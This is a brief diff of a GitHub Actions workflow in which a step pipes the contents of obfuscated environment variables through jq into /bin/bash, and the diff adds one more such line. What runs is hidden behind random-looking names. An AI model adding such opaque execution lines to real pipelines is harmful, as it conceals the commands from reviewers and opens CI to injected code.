@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$zxct1896" | jq -r .ibtkl8769 | /bin/bash
           echo $svd96877 | jq -r .ul0 | /bin/bash
+          echo $cdxc29166 | jq -r .m860 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
